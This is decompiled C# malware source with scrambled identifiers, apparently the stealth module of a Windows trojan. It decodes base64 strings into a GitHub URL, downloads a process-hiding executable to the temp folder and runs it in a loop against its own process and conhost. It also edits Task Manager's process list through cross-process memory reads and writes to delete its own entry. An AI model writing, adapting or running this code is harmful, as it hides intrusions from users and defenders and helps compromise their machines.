using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace kuMeqwHpurUBOD;

internal class VqpeLWAVRhnNLC
{
	private struct wzNlrAKeWkxz
	{
		public uint SnAhVkbteStK;

		public IntPtr WyVileNtCXHIl;

		public IntPtr mttOVCLpBJ;

		public uint IpBxasGqhyr;

		public uint MeYPEkpSkdRa;

		public IntPtr pOAnexebpFJzHwch;

		public uint cOkglSdmswIzt;

		public int DrXBzmJRPdne;

		public IntPtr fheVXaLiOMWN;
	}

	private static volatile bool GOpUwPJJhoDAR = false;

	public static volatile bool FdajeWXBJknwTpa = true;

	public static string hqQrIuISTB()
	{
		if (IntPtr.Size == 8)
		{
			BErRpdYOfQAwSr.PKLvCQuQNcTS = YqZcZuoKEyRA(new Uri(BErRpdYOfQAwSr.oMKRHTBqYRfOk("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2QzNWhhL1Byb2Nlc3NIaWRlL21hc3Rlci9iaW5zL1Byb2Nlc3NIaWRlNjQuZXhl")));
		}
		else
		{
			BErRpdYOfQAwSr.PKLvCQuQNcTS = YqZcZuoKEyRA(new Uri(BErRpdYOfQAwSr.oMKRHTBqYRfOk("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2QzNWhhL1Byb2Nlc3NIaWRlL21hc3Rlci9iaW5zL1Byb2Nlc3NIaWRlMzIuZXhl")));
		}
		return BErRpdYOfQAwSr.PKLvCQuQNcTS;
	}

	public static string YqZcZuoKEyRA(Uri uri_0)
	{
		try
		{
			string path = Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe";
			WebClient webClient = new WebClient();
			webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
			return Path.Combine(Path.GetTempPath(), path);
		}
		catch
		{
		}
		return string.Empty;
	}

	public static Process nXwKPZSaqfrL(string string_0)
	{
		Process[] processes = Process.GetProcesses();
		int num = 0;
		Process process;
		while (true)
		{
			if (num < processes.Length)
			{
				process = processes[num];
				if (process.ProcessName.Contains(string_0))
				{
					break;
				}
				num++;
				continue;
			}
			return null;
		}
		return process;
	}

	public static void BJvMQPSHzrRdKdx(string[] string_0)
	{
		string text = hqQrIuISTB();
		if (string.IsNullOrEmpty(text))
		{
			return;
		}
		while (true)
		{
			foreach (string string_ in string_0)
			{
				Process process = nXwKPZSaqfrL(string_);
				if (process != null)
				{
					string text2 = process.Id.ToString();
					BErRpdYOfQAwSr.uATAppcKlZ(text, text2 + " " + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName));
					BErRpdYOfQAwSr.uATAppcKlZ(text, text2 + " " + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName) + " *32");
					BErRpdYOfQAwSr.uATAppcKlZ(text, text2 + " " + BErRpdYOfQAwSr.oMKRHTBqYRfOk("Y29uaG9zdC5leGU="));
				}
			}
			Thread.Sleep(200);
		}
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr OpenProcess(int int_0, bool bool_0, uint uint_0);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr VirtualAllocEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, int int_0, int int_1);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool VirtualFreeEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, int int_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CloseHandle(IntPtr TbuTKImetuELu);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool WriteProcessMemory(IntPtr lzaawmJkfxGWuQkQ, IntPtr JrMeNvPLbfpw, byte[] NXDoxBhnuK, uint bOZdIKgsStKky, out UIntPtr HepoiBCxom);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool ReadProcessMemory(IntPtr tGoboUUOTzz, IntPtr UjGmCGdpbUMUXB, [Out] byte[] ayngXxhpxMLHsC, int RagTomDgaMuQP, out UIntPtr EGdQKgqoOQlW);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern uint GetWindowThreadProcessId(IntPtr CHsDgByRKfZ, out uint mysGHPqIBVV);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern IntPtr SendMessage(IntPtr intptr_0, uint uint_0, IntPtr intptr_1, IntPtr intptr_2);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindow(string string_0, string string_1);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindowEx(IntPtr intptr_0, IntPtr intptr_1, string string_0, string string_1);

	private static byte[] qrqNJJHgkslYk(object object_0)
	{
		int num = Marshal.SizeOf(object_0);
		byte[] array = new byte[num];
		IntPtr intPtr = Marshal.AllocHGlobal(num);
		Marshal.StructureToPtr(object_0, intPtr, fDeleteOld: true);
		Marshal.Copy(intPtr, array, 0, num);
		Marshal.FreeHGlobal(intPtr);
		return array;
	}

	private static IntPtr iTmITCTgjdVi(uint uint_0)
	{
		return OpenProcess(56, bool_0: false, uint_0);
	}

	private static void XOJtpnSZMuheJ(IntPtr intptr_0)
	{
		CloseHandle(intptr_0);
	}

	private static IntPtr pMfEgLRmsrWuLW(uint uint_0, IntPtr intptr_0)
	{
		return VirtualAllocEx(intptr_0, IntPtr.Zero, uint_0, 12288, 4);
	}

	private static void mPdwcdtbQQLofSb(IntPtr intptr_0, IntPtr intptr_1, uint uint_0)
	{
		VirtualFreeEx(intptr_0, intptr_1, uint_0, 32768);
	}

	private static IntPtr lCkfhKaDqpN()
	{
		IntPtr intPtr = FindWindow("TaskManagerWindow", "Administrador de tareas");
		if (intPtr == IntPtr.Zero)
		{
			intPtr = FindWindow("#32770", "Task Manager");
			intPtr = FindWindowEx(intPtr, IntPtr.Zero, "#32770", null);
			return FindWindowEx(intPtr, IntPtr.Zero, "SysListView32", "Processes");
		}
		intPtr = FindWindowEx(intPtr, IntPtr.Zero, "#32770", null);
		return FindWindowEx(intPtr, IntPtr.Zero, "SysListView32", "Procesos");
	}

	private static IntPtr rryNevEKquHuWa(IntPtr intptr_0)
	{
		return SendMessage(intptr_0, 4100u, IntPtr.Zero, IntPtr.Zero);
	}

	private static void KInUACvNococoHbM(IntPtr intptr_0, IntPtr intptr_1)
	{
		SendMessage(intptr_0, 4104u, intptr_1, IntPtr.Zero);
	}

	private static void celsIwgRLunq(IntPtr intptr_0)
	{
		SendMessage(intptr_0, 4124u, IntPtr.Zero, IntPtr.Zero);
	}

	private static string tuQQOJHNknnhVget(IntPtr intptr_0, IntPtr intptr_1)
	{
		byte[] array = new byte[50];
		wzNlrAKeWkxz wzNlrAKeWkxz = default(wzNlrAKeWkxz);
		GetWindowThreadProcessId(intptr_0, out var mysGHPqIBVV);
		IntPtr intPtr = iTmITCTgjdVi(mysGHPqIBVV);
		IntPtr intPtr2 = pMfEgLRmsrWuLW((uint)Marshal.SizeOf(wzNlrAKeWkxz), intPtr);
		IntPtr intPtr3 = pMfEgLRmsrWuLW(50u, intPtr);
		wzNlrAKeWkxz.WyVileNtCXHIl = intptr_1;
		wzNlrAKeWkxz.mttOVCLpBJ = (IntPtr)0;
		wzNlrAKeWkxz.cOkglSdmswIzt = 50u;
		wzNlrAKeWkxz.pOAnexebpFJzHwch = intPtr3;
		WriteProcessMemory(intPtr, intPtr2, qrqNJJHgkslYk(wzNlrAKeWkxz), (uint)Marshal.SizeOf(wzNlrAKeWkxz), out var HepoiBCxom);
		SendMessage(intptr_0, 4141u, intptr_1, intPtr2);
		ReadProcessMemory(intPtr, intPtr3, array, 50, out HepoiBCxom);
		mPdwcdtbQQLofSb(intPtr, intPtr2, (uint)Marshal.SizeOf(wzNlrAKeWkxz));
		mPdwcdtbQQLofSb(intPtr, intPtr3, 50u);
		XOJtpnSZMuheJ(intPtr);
		return Encoding.ASCII.GetString(array);
	}

	private static void eEvNlPYjufF(string string_0)
	{
		IntPtr intPtr = lCkfhKaDqpN();
		if (!(intPtr != IntPtr.Zero))
		{
			return;
		}
		int num = (int)rryNevEKquHuWa(intPtr);
		for (int i = 0; i < num; i++)
		{
			string text = tuQQOJHNknnhVget(intPtr, (IntPtr)i);
			if (text.Contains(string_0))
			{
				KInUACvNococoHbM(intPtr, (IntPtr)i);
			}
		}
	}

	private static void nBtpfrHBrxTo()
	{
		IntPtr intPtr = lCkfhKaDqpN();
		if (intPtr != IntPtr.Zero)
		{
			celsIwgRLunq(intPtr);
			celsIwgRLunq(intPtr);
			celsIwgRLunq(intPtr);
			celsIwgRLunq(intPtr);
			celsIwgRLunq(intPtr);
		}
	}

	public static void YPxFSRPJzDpLIv()
	{
		Thread thread = new Thread(lZqDNWeUuhL);
		thread.Start();
	}

	private static void lZqDNWeUuhL()
	{
		while (!GOpUwPJJhoDAR)
		{
			if (FdajeWXBJknwTpa)
			{
				eEvNlPYjufF(Process.GetCurrentProcess().ProcessName + ".exe");
				Thread.Sleep(525);
			}
			else
			{
				nBtpfrHBrxTo();
				Thread.Sleep(1000);
			}
		}
		GOpUwPJJhoDAR = false;
	}
}
